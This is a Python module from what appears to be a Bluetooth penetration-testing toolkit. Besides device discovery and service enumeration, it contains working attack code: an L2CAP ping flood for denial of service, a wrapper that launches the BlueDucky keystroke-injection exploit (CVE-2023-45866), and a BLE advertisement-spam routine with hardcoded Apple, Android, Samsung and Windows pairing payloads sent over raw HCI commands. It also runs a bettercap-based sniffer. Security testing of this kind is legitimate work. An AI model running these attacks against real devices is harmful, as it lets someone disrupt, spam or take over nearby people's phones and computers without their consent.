"""RadioRecon Opus V4 — Classic Bluetooth Tools.

Uses native Linux tools (hcitool, l2ping, sdptool, bluetoothctl)
for Classic Bluetooth operations. No bleak dependency.
These work reliably because they use the kernel HCI interface directly.
"""
from __future__ import annotations
import subprocess
import re
import logging
import time
from datetime import datetime
try:
    from oui_database import enrich_vendor
except Exception:
    enrich_vendor = None

logger = logging.getLogger("radiorecon.bt_classic")


def active_hci() -> str:
    try:
        r = subprocess.run(["hciconfig"], capture_output=True, text=True, timeout=5)
        adapters = []
        current = None
        block = []
        for line in (r.stdout or "").splitlines():
            m = re.match(r"^(hci\d+):", line)
            if m:
                if current:
                    adapters.append((current, "\n".join(block)))
                current = m.group(1)
                block = [line]
            elif current:
                block.append(line)
        if current:
            adapters.append((current, "\n".join(block)))
        for iface, text in adapters:
            if "UP RUNNING" in text:
                return iface
        for iface, text in adapters:
            if "UP" in text:
                return iface
        if adapters:
            return adapters[0][0]
    except Exception:
        pass
    return "hci0"


def _run(cmd: list, timeout: int = 15) -> dict:
    """Run a shell command with proper timeout handling."""
    try:
        # Use Popen for reliable kill on timeout
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            stdout, stderr = proc.communicate(timeout=timeout)
            return {"success": proc.returncode == 0, "stdout": stdout.strip(),
                    "stderr": stderr.strip(), "returncode": proc.returncode}
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            stdout, stderr = proc.communicate(timeout=3)
            # Return partial output (useful for scans)
            return {"success": True, "stdout": (stdout or "").strip(),
                    "stderr": "timeout (partial results)", "returncode": 0}
    except FileNotFoundError:
        return {"success": False, "stdout": "", "stderr": f"{cmd[0]} not found — install with: sudo apt install bluez bluez-tools", "returncode": -2}
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e), "returncode": -3}


def check_tools() -> dict:
    """Check which Classic BT tools are available."""
    tools = {}
    for tool in ["hcitool", "l2ping", "sdptool", "bluetoothctl", "hciconfig", "hcidump", "bettercap"]:
        r = _run(["which", tool], timeout=3)
        tools[tool] = r["success"]
    return tools


def _classic_vendor(mac: str, name: str = "") -> tuple[str, str]:
    if enrich_vendor:
        try:
            vendor, category = enrich_vendor(mac, name, "")
            if vendor and vendor not in ("—", "-", "Unknown", "Random MAC"):
                return vendor, category
        except Exception:
            pass
    return "", ""


# ═══════════════════════════════════════════════════════════
# DISCOVERY via hcitool/bluetoothctl
# ═══════════════════════════════════════════════════════════

def hci_scan_classic(timeout: int = 10) -> list:
    """Scan for Classic Bluetooth devices using hcitool inq."""
    iface = active_hci()
    _run(["hciconfig", iface, "up"], timeout=3)
    # hcitool inq --length is in units of 1.28s
    length = max(timeout // 2, 3)
    r = _run(["hcitool", "inq", "--length", str(length)], timeout=timeout + 5)
    devices = []
    macs = []
    if r["stdout"]:
        for line in r["stdout"].split("\n"):
            m = re.match(r"\s*([0-9A-F:]{17})\s+.*", line, re.IGNORECASE)
            if m:
                macs.append(m.group(1).upper())

    # Resolve names in parallel threads (up to 3s each, non-blocking overall)
    import concurrent.futures as _cf
    def _resolve(mac):
        try:
            nr = _run(["hcitool", "name", mac], timeout=5)
            name = nr["stdout"].strip() if nr.get("success") and nr["stdout"].strip() else ""
            if not name:
                # Try bluetoothctl info
                import subprocess as _bctl
                ri = _bctl.run(["bluetoothctl", "info", mac],
                               capture_output=True, text=True, timeout=4)
                for ln in (ri.stdout or "").split("\n"):
                    if "Name:" in ln:
                        name = ln.split("Name:")[-1].strip()
                        break
            return mac, name
        except Exception:
            return mac, ""

    with _cf.ThreadPoolExecutor(max_workers=4) as ex:
        results = list(ex.map(_resolve, macs))

    for mac, name in results:
        vendor, category = _classic_vendor(mac, name)
        devices.append({"mac": mac, "name": name, "type": "classic",
                        "source": "hcitool", "vendor": vendor, "category": category})
    return devices


def hci_scan_ble(timeout: int = 10) -> list:
    """Scan for BLE devices using hcitool lescan."""
    iface = active_hci()
    _run(["hciconfig", iface, "up"], timeout=3)
    # hcitool lescan outputs continuously, we kill after timeout
    r = _run(["hcitool", "lescan"], timeout=timeout)
    devices = []
    seen = set()
    output = r["stdout"] + " " + r["stderr"]
    for line in output.split("\n"):
        m = re.match(r"\s*([0-9A-F:]{17})\s+(.*)", line, re.IGNORECASE)
        if m:
            mac = m.group(1).upper()
            name = m.group(2).strip() or "Unknown"
            if mac not in seen and name != "(unknown)":
                seen.add(mac)
                devices.append({"mac": mac, "name": name, "type": "ble", "source": "hcitool"})
    return devices


def hci_get_name(mac: str) -> str:
    """Get device name via hcitool name."""
    r = _run(["hcitool", "name", mac], timeout=8)
    return r["stdout"].strip() if r["success"] and r["stdout"].strip() else "Unknown"


# ═══════════════════════════════════════════════════════════
# RECON via sdptool / hcitool info
# ═══════════════════════════════════════════════════════════

def sdp_browse(mac: str) -> dict:
    """Browse SDP services on a Classic BT device."""
    r = _run(["sdptool", "browse", mac], timeout=20)
    if not r["success"]:
        return {"mac": mac, "error": r["stderr"], "services": []}

    services = []
    current = {}
    for line in r["stdout"].split("\n"):
        line = line.strip()
        if line.startswith("Service Name:"):
            if current:
                services.append(current)
            current = {"name": line.split(":", 1)[1].strip()}
        elif line.startswith("Service RecHandle:"):
            current["handle"] = line.split(":", 1)[1].strip()
        elif line.startswith("Protocol Descriptor List:"):
            current["protocols"] = []
        elif line.startswith('"') and "protocols" in current:
            current["protocols"].append(line.strip('"'))
        elif "Channel:" in line:
            current["channel"] = line.split("Channel:")[1].strip()
        elif "PSM:" in line:
            current["psm"] = line.split("PSM:")[1].strip()
        elif line.startswith("Service Class ID List:"):
            current["class_ids"] = []
        elif "Profile Descriptor List:" in line:
            current["profiles"] = []
    if current:
        services.append(current)

    return {"mac": mac, "services": services, "count": len(services), "raw": r["stdout"][:2000]}


def hci_info(mac: str) -> dict:
    """Get device info via hcitool info."""
    r = _run(["hcitool", "info", mac], timeout=10)
    info = {"mac": mac, "raw": r["stdout"]}
    if r["success"]:
        for line in r["stdout"].split("\n"):
            if "Device Name:" in line:
                info["name"] = line.split(":", 1)[1].strip()
            elif "OUI Company:" in line:
                info["company"] = line.split(":", 1)[1].strip()
            elif "LMP Version:" in line:
                info["lmp_version"] = line.split(":", 1)[1].strip()
            elif "Manufacturer:" in line:
                info["manufacturer"] = line.split(":", 1)[1].strip()
    return info


# ═══════════════════════════════════════════════════════════
# EXPLOITS using native tools
# ═══════════════════════════════════════════════════════════

def l2ping_flood(mac: str, count: int = 50, size: int = 600) -> dict:
    """L2ping flood — tests DoS resilience via L2CAP ping."""
    started = datetime.now().isoformat()
    r = _run(["l2ping", "-c", str(count), "-s", str(size), "-f", mac], timeout=30)
    result = {
        "check_id": "BT-DOS-001", "mac": mac, "started": started,
        "test_name": "L2CAP Ping Flood (DoS Resilience)",
        "completed": datetime.now().isoformat(),
    }
    if r["success"]:
        # Parse response times
        lines = r["stdout"].split("\n")
        sent = len([l for l in lines if "bytes from" in l.lower()])
        result.update({
            "status": "VULNERABLE" if sent > count // 2 else "PARTIAL",
            "evidence": f"L2ping: {sent}/{count} responses received. Device accepted {size}-byte L2CAP packets.",
            "impact": "Device responds to L2CAP flood — potential for Bluetooth DoS attack.",
            "remediation": "Implement L2CAP packet rate limiting. Filter oversized ping requests.",
            "raw": r["stdout"][:500],
        })
    elif "timeout" in r["stderr"].lower() or r["returncode"] == -1:
        result.update({
            "status": "NOT_VULNERABLE",
            "evidence": "Device did not respond to L2ping — may have flood protection or is out of range.",
        })
    else:
        result.update({"status": "ERROR", "evidence": r["stderr"][:200]})
    return result


def sdp_enum_attack(mac: str) -> dict:
    """Enumerate SDP services — reveals attack surface."""
    started = datetime.now().isoformat()
    sdp = sdp_browse(mac)
    result = {
        "check_id": "BT-SDP-001", "mac": mac, "started": started,
        "test_name": "SDP Service Enumeration",
        "completed": datetime.now().isoformat(),
    }
    if sdp.get("services"):
        svc_names = [s.get("name", "?") for s in sdp["services"]]
        # Check for dangerous services
        dangerous = []
        for s in sdp["services"]:
            name = s.get("name", "").lower()
            if any(kw in name for kw in ["obex", "file transfer", "ftp", "push", "serial", "dial", "handsfree"]):
                dangerous.append(s.get("name"))

        result.update({
            "status": "VULNERABLE" if dangerous else "INFO",
            "evidence": f"{len(sdp['services'])} SDP services found: {', '.join(svc_names[:10])}. Dangerous: {', '.join(dangerous) if dangerous else 'none'}",
            "services": sdp["services"][:20],
            "dangerous_services": dangerous,
            "impact": f"{'Dangerous services exposed: ' + ', '.join(dangerous) + '. Potential for file access, audio injection.' if dangerous else 'Services enumerated — attack surface mapped.'}",
            "remediation": "Disable unused Bluetooth profiles. Restrict SDP visibility.",
        })
    elif sdp.get("error"):
        result.update({"status": "UNREACHABLE", "evidence": f"SDP browse failed: {sdp['error']}"})
    else:
        result.update({"status": "NOT_VULNERABLE", "evidence": "No SDP services exposed."})
    return result


def rfcomm_probe(mac: str, channels: list = None) -> dict:
    """Probe RFCOMM channels for open serial services."""
    started = datetime.now().isoformat()
    if channels is None:
        channels = list(range(1, 11))

    open_channels = []
    for ch in channels:
        r = _run(["timeout", "3", "rfcomm", "connect", active_hci(), mac, str(ch)], timeout=5)
        output = r["stdout"] + r["stderr"]
        if "connected" in output.lower() or "press ctrl" in output.lower():
            open_channels.append(ch)
            # Kill the connection
            _run(["rfcomm", "release", str(ch)], timeout=3)

    result = {
        "check_id": "BT-RFCOMM-001", "mac": mac, "started": started,
        "test_name": "RFCOMM Channel Probe",
        "completed": datetime.now().isoformat(),
    }
    if open_channels:
        result.update({
            "status": "VULNERABLE",
            "evidence": f"Open RFCOMM channels: {open_channels}. These accept connections without authentication.",
            "open_channels": open_channels,
            "impact": "Open RFCOMM channels allow serial data exchange without pairing.",
            "remediation": "Require authentication for RFCOMM connections. Close unused channels.",
        })
    else:
        result.update({
            "status": "NOT_VULNERABLE",
            "evidence": f"No open RFCOMM channels found (tested {len(channels)} channels).",
        })
    return result


# ═══════════════════════════════════════════════════════════
# BETTERCAP BLE SNIFFER (continuous capture)
# ═══════════════════════════════════════════════════════════

_sniffer_proc = None
_btmon_proc = None
_sniffer_data = {"running": False, "devices": {}, "log": [], "pcap": None, "started": None}


def sniffer_start(iface: str = "hci0", pcap_file: str = None) -> dict:
    """Start BLE sniffer: bettercap for device discovery + btmon for PCAP capture."""
    global _sniffer_proc, _sniffer_data, _btmon_proc
    import os

    if _sniffer_proc and _sniffer_proc.poll() is None:
        return {"started": False, "error": "Sniffer already running. Stop first."}

    _run(["hciconfig", iface, "up"], timeout=3)
    _run(["bluetoothctl", "scan", "off"], timeout=3)
    time.sleep(0.3)

    if not pcap_file:
        os.makedirs("captures", exist_ok=True)
        pcap_file = f"captures/ble_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"

    _sniffer_data = {"running": True, "devices": {}, "log": [], "pcap": pcap_file,
                     "started": datetime.now().isoformat(), "iface": iface}

    # 1. Start btmon for PCAP capture (captures all HCI traffic)
    _btmon_proc = None
    try:
        _btmon_proc = subprocess.Popen(
            ["btmon", "-w", pcap_file],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        _sniffer_data["log"].append({"time": datetime.now().isoformat(),
                                      "line": f"btmon started → {pcap_file}"})
    except FileNotFoundError:
        # Try hcidump as fallback
        try:
            _btmon_proc = subprocess.Popen(
                ["hcidump", "-w", pcap_file],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
            _sniffer_data["log"].append({"time": datetime.now().isoformat(),
                                          "line": f"hcidump started → {pcap_file}"})
        except FileNotFoundError:
            _sniffer_data["log"].append({"time": datetime.now().isoformat(),
                                          "line": "Warning: btmon/hcidump not found. No PCAP capture."})

    # 2. Start bettercap for device discovery (or hcitool lescan as fallback)
    tools = check_tools()
    if tools.get("bettercap"):
        try:
            _sniffer_proc = subprocess.Popen(
                ["sudo", "bettercap", "-no-history", "-eval", "ble.recon on"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, env={**os.environ, "TERM": "dumb"}
            )
            import threading
            def _read_output():
                try:
                    for line in iter(_sniffer_proc.stdout.readline, ''):
                        if not line: break
                        clean = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
                        if not clean: continue
                        _sniffer_data["log"].append({"time": datetime.now().isoformat(), "line": clean[:300]})
                        if len(_sniffer_data["log"]) > 200:
                            _sniffer_data["log"] = _sniffer_data["log"][-200:]
                        _parse_bettercap_line(clean)
                except Exception: pass
                finally: _sniffer_data["running"] = False
            threading.Thread(target=_read_output, daemon=True).start()
        except Exception as e:
            _sniffer_data["log"].append({"time": datetime.now().isoformat(), "line": f"bettercap error: {e}"})
    else:
        # Fallback: hcitool lescan
        try:
            _sniffer_proc = subprocess.Popen(
                ["hcitool", "-i", iface, "lescan", "--duplicates"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            import threading
            def _read_hci():
                try:
                    for line in iter(_sniffer_proc.stdout.readline, ''):
                        if not line: break
                        clean = line.strip()
                        if not clean: continue
                        _sniffer_data["log"].append({"time": datetime.now().isoformat(), "line": clean[:200]})
                        if len(_sniffer_data["log"]) > 200:
                            _sniffer_data["log"] = _sniffer_data["log"][-200:]
                        _parse_bettercap_line(clean)
                except Exception: pass
                finally: _sniffer_data["running"] = False
            threading.Thread(target=_read_hci, daemon=True).start()
        except Exception as e:
            _sniffer_data["running"] = False
            return {"started": False, "error": f"No sniffer available: {e}"}

    return {"started": True, "pcap": pcap_file, "iface": iface,
            "btmon": _btmon_proc is not None}


def _parse_bettercap_line(line: str):
    """Parse bettercap/hcitool output line for BLE device data."""
    m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
    if m:
        mac = m.group(1).upper()
        dev = _sniffer_data["devices"].get(mac, {
            "mac": mac, "name": "", "rssi": -99, "services": [],
            "vendor": "", "first_seen": datetime.now().isoformat(),
            "packets": 0
        })
        dev["packets"] += 1
        dev["last_seen"] = datetime.now().isoformat()

        # Extract name — multiple bettercap formats
        if not dev["name"]:
            # Format: "detected as XX:XX:XX NAME" or "detected as XX:XX:XX (Vendor)"
            nm = re.search(r"detected as\s+[0-9A-Fa-f:]+\s+(.+?)(?:\s+-\d+\s*dBm|$)", line)
            if nm:
                name = nm.group(1).strip().rstrip('.')
                if name and name != "?":
                    dev["name"] = name
            # Format: "[ble.device.new] ... NAME detected as"
            if not dev["name"]:
                nm2 = re.search(r"new BLE device\s+(.+?)\s+detected", line)
                if nm2:
                    dev["name"] = nm2.group(1).strip()
            # Format: "name: 'DeviceName'" or "Name: DeviceName"
            if not dev["name"]:
                nm3 = re.search(r"name[:\s]+['\"]?([^'\"]{2,})", line, re.IGNORECASE)
                if nm3:
                    dev["name"] = nm3.group(1).strip()
            # hcitool lescan format: "XX:XX:XX:XX:XX:XX DeviceName"
            if not dev["name"]:
                after_mac = line[m.end():].strip()
                if after_mac and not after_mac.startswith('-') and len(after_mac) > 1:
                    dev["name"] = after_mac.split('\t')[0].split('  ')[0].strip()

        # Extract RSSI
        rm = re.search(r"(-\d+)\s*dBm", line)
        if rm:
            dev["rssi"] = int(rm.group(1))

        # Extract vendor from parentheses: (Samsung Electronics Co.,Ltd)
        vm = re.search(r"\(([^)]+)\)", line)
        if vm and not dev["vendor"]:
            dev["vendor"] = vm.group(1).strip()[:30]

        _sniffer_data["devices"][mac] = dev


def sniffer_stop() -> dict:
    """Stop sniffer and btmon."""
    global _sniffer_proc, _btmon_proc
    import os
    
    if _sniffer_proc and _sniffer_proc.poll() is None:
        _sniffer_proc.kill()
        _sniffer_proc.wait(timeout=5)
        _sniffer_proc = None
    
    if _btmon_proc and _btmon_proc.poll() is None:
        _btmon_proc.kill()
        _btmon_proc.wait(timeout=5)
        _btmon_proc = None
    
    _sniffer_data["running"] = False
    _sniffer_data["stopped"] = datetime.now().isoformat()
    
    # Check PCAP file
    pcap = _sniffer_data.get("pcap", "")
    pcap_size = 0
    if pcap and os.path.isfile(pcap):
        pcap_size = os.path.getsize(pcap)
    
    return {
        "stopped": True,
        "devices_found": len(_sniffer_data["devices"]),
        "pcap": pcap,
        "pcap_size": pcap_size,
        "pcap_exists": pcap_size > 0,
    }


def sniffer_status() -> dict:
    """Get sniffer status and captured data."""
    return {
        "running": _sniffer_data["running"],
        "devices": list(_sniffer_data["devices"].values()),
        "device_count": len(_sniffer_data["devices"]),
        "log": _sniffer_data["log"][-30:],  # Last 30 log lines
        "pcap": _sniffer_data.get("pcap"),
        "started": _sniffer_data.get("started"),
    }


def sniffer_enum_device(mac: str) -> dict:
    """Use bettercap to enumerate a specific BLE device."""
    tools = check_tools()
    if not tools.get("bettercap"):
        return {"error": "bettercap not installed"}

    r = _run([
        "bettercap", "-eval",
        f"ble.recon on; sleep 5; ble.enum {mac}; sleep 3; ble.show; quit"
    ], timeout=20)

    return {
        "mac": mac,
        "raw": (r["stdout"] + r["stderr"])[:5000],
        "success": r["success"],
    }


# ═══════════════════════════════════════════════════════════
# EXTERNAL TOOL INTEGRATION
# ═══════════════════════════════════════════════════════════

def check_external_tools() -> dict:
    """Check for external exploit tools. Reads paths from tools_config.json first, then searches known locations."""
    import os, json
    tools = {}

    # 1. Try tools_config.json (created by install.sh)
    config_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools_config.json"),
        "/home/kali/Downloads/radiorecon/tools_config.json",
    ]
    config = {}
    for cp in config_paths:
        if os.path.isfile(cp):
            try:
                with open(cp) as f:
                    config = json.load(f).get("paths", {})
                break
            except Exception:
                pass

    # 2. Build search paths: config paths + tools/ subdir + common locations
    script_dir = os.path.dirname(os.path.abspath(__file__))
    tools_dir = os.path.join(script_dir, "tools")

    search = {
        "applejuice": [
            os.path.join(config.get("applejuice", ""), "app.py") if config.get("applejuice") else "",
            os.path.join(tools_dir, "AppleJuice", "app.py"),
            os.path.join(os.path.dirname(__file__), "tools", "AppleJuice", "app.py"),
            "/opt/AppleJuice/app.py",
        ],
        "blueducky": [
            os.path.join(os.path.dirname(__file__), "tools", "BlueDucky", "BlueDucky.py"),
            os.path.join(os.path.dirname(__file__), "tools", "BluetoothDucky", "BluetoothDucky.py"),
            config.get("blueducky", ""),
            os.path.join(tools_dir, "BlueDucky", "BlueDucky.py"),
            "/opt/BlueDucky/BlueDucky.py",
        ],
        "ble_spam": [
            os.path.join(config.get("ble_spam", ""), "BLE-Spam.py") if config.get("ble_spam") else "",
            os.path.join(tools_dir, "Bluetooth-LE-Spam", "app", "src", "main", "java"),  # Android project
            os.path.join(tools_dir, "Bluetooth-LE-Spam"),
        ],
        "bluetoolkit": [
            os.path.join(config.get("bluetoolkit", ""), "bluetoolkit.py") if config.get("bluetoolkit") else "",
            os.path.join(tools_dir, "BlueToolkit", "bluetoolkit.py"),
            os.path.join(tools_dir, "BlueToolkit"),
        ],
        "bluetooth_ducky": [
            os.path.join(config.get("bluetooth_ducky", ""), "BluetoothDucky.py") if config.get("bluetooth_ducky") else "",
            os.path.join(tools_dir, "BluetoothDucky"),
        ],
        "blendr": [
            config.get("blendr", ""),
            os.path.join(tools_dir, "blendr"),
        ],
    }

    for name, possible in search.items():
        for p in possible:
            if p and (os.path.isfile(p) or os.path.isdir(p)):
                tools[name] = p
                break
        if name not in tools:
            tools[name] = None

    return tools


def run_blueducky(mac: str, payload: str = "STRING Hello from RadioRecon") -> dict:
    """Run BlueDucky CVE-2023-45866 exploit as subprocess."""
    ext = check_external_tools()
    # Try BlueDucky or BluetoothDucky (both implement CVE-2023-45866)
    bd_path = ext.get("blueducky") or ext.get("bluetooth_ducky")
    if not bd_path:
        return {"status": "NOT_INSTALLED",
                "evidence": "BlueDucky not found. Incluído em tools/BlueDucky/. Instale: git clone https://github.com/pentestfunctions/BlueDucky.git tools/BlueDucky",
                "check_id": "CVE-2023-45866"}

    import tempfile, os
    # Write payload
    payload_file = tempfile.mktemp(suffix=".txt")
    with open(payload_file, "w") as f:
        f.write(payload + "\n")

    started = datetime.now().isoformat()
    # bd_path already set above
    bd_dir = os.path.dirname(bd_path)

    r = _run(["python3", bd_path, "-t", mac, "-p", payload_file], timeout=30)

    try:
        os.unlink(payload_file)
    except Exception:
        pass

    result = {
        "check_id": "CVE-2023-45866", "mac": mac, "started": started,
        "test_name": "BlueDucky — BLE HID Keyboard Injection",
        "completed": datetime.now().isoformat(),
    }
    output = r["stdout"] + r["stderr"]
    if "successful" in output.lower() or "connected" in output.lower():
        result.update({
            "status": "VULNERABLE",
            "evidence": "BlueDucky successfully connected and injected keystrokes via BLE HID.",
            "impact": "CRITICAL — Unauthenticated keystroke injection. Attacker can execute commands on the target device.",
            "business_impact": "Full device compromise. Can open URLs, install apps, exfiltrate data.",
            "remediation": "Update device firmware. Disable Bluetooth when not in use. iOS: update to 17.1+, Android: apply security patches.",
            "raw": output[:1000],
        })
    elif "not vulnerable" in output.lower() or "patched" in output.lower():
        result.update({"status": "NOT_VULNERABLE", "evidence": "Device appears patched against CVE-2023-45866.", "raw": output[:500]})
    else:
        result.update({"status": "INCONCLUSIVE", "evidence": f"BlueDucky output: {output[:300]}", "raw": output[:1000]})
    return result


def run_ble_spam(spam_type: str = "all", duration: int = 10, targets: list = None) -> dict:
    """Run BLE advertisement spam — targeted or broadcast.
    
    spam_type: apple, android, samsung, windows, all
    targets: list of {"mac": "XX:XX", "name": "...", "os": "..."} — if provided, logs per-target
    """
    ext = check_external_tools()
    started = datetime.now().isoformat()
    
    # Map spam_type to descriptive attack name
    attack_names = {
        "apple": "iOS AirPods Popup Spam",
        "android": "Android Fast Pair Notification",
        "samsung": "Samsung SmartTag Notification",
        "windows": "Windows Swift Pair Popup",
        "all": "Multi-Platform BLE Spam",
    }
    attack_name = attack_names.get(spam_type, f"BLE Spam ({spam_type})")
    
    result = {
        "check_id": "BLE-SPAM-001",
        "started": started,
        "test_name": attack_name,
        "spam_type": spam_type,
        "duration": duration,
        "targets": targets or [],
        "target_results": [],
    }
    
    if not ext.get("ble_spam"):
        # Bluetooth-LE-Spam is an Android app, not a Python script
        # We implement our own BLE spam using hcitool and Python
        try:
            _do_ble_spam_native(spam_type, duration, targets or [], result)
        except Exception as e:
            result["status"] = "ERROR"
            result["evidence"] = f"BLE spam failed: {e}"
    else:
        r = _run(["timeout", str(duration), "python3", ext["ble_spam"], "--type", spam_type], timeout=duration + 5)
        result["status"] = "EXECUTED"
        result["evidence"] = f"{attack_name} executed for {duration}s."
        result["raw"] = (r["stdout"] + r["stderr"])[:500]
    
    result["completed"] = datetime.now().isoformat()
    
    # Generate per-target results for reporting
    if targets:
        for tgt in targets:
            result["target_results"].append({
                "mac": tgt.get("mac", "?"),
                "name": tgt.get("name", "Unknown"),
                "os": tgt.get("os", "?"),
                "spam_type": spam_type,
                "status": result.get("status", "EXECUTED"),
                "attack": attack_name,
            })
    
    return result


def _do_ble_spam_native(spam_type: str, duration: int, targets: list, result: dict):
    """Native BLE spam implementation using hcitool.
    Sends crafted BLE advertisements that trigger popups on target platforms.
    """
    import struct
    
    # Ensure adapter is up
    _run(["hciconfig", active_hci(), "up"], timeout=3)
    _run(["hciconfig", active_hci(), "noscan"], timeout=3)
    
    # Platform-specific advertisement payloads
    # These are the same patterns used by Bluetooth-LE-Spam
    payloads = {
        "apple": [
            # AirPods Pro proximity pairing
            "1eff4c0007190120204f021002eb",
            # AppleTV setup
            "1eff4c000719012040680200",
        ],
        "android": [
            # Google Fast Pair (Pixel Buds)
            "0302f0fe1116f0fe0006000000000000000000000000",
            # Google Fast Pair (generic)
            "0302f0fe1116f0fe000600aabb",
        ],
        "samsung": [
            # Samsung SmartTag
            "1aff75000102030000000000000000000000000000000000000000",
        ],
        "windows": [
            # Microsoft Swift Pair
            "1dff0600030080",
        ],
    }
    
    types_to_send = [spam_type] if spam_type != "all" else ["apple", "android", "samsung", "windows"]
    
    sent_count = 0
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for stype in types_to_send:
            for payload in payloads.get(stype, []):
                try:
                    # Set advertising data
                    _run(["hcitool", "-i", active_hci(), "cmd", "0x08", "0x0008"] + 
                         [payload[i:i+2] for i in range(0, len(payload), 2)], timeout=2)
                    # Enable advertising briefly
                    _run(["hcitool", "-i", active_hci(), "cmd", "0x08", "0x000A", "01"], timeout=2)
                    time.sleep(0.1)
                    # Disable advertising
                    _run(["hcitool", "-i", active_hci(), "cmd", "0x08", "0x000A", "00"], timeout=2)
                    sent_count += 1
                except Exception:
                    pass
            time.sleep(0.3)
    
    result["status"] = "EXECUTED"
    result["evidence"] = f"{result['test_name']} — {sent_count} advertisements sent in {duration}s targeting {', '.join(types_to_send)}."
    result["packets_sent"] = sent_count
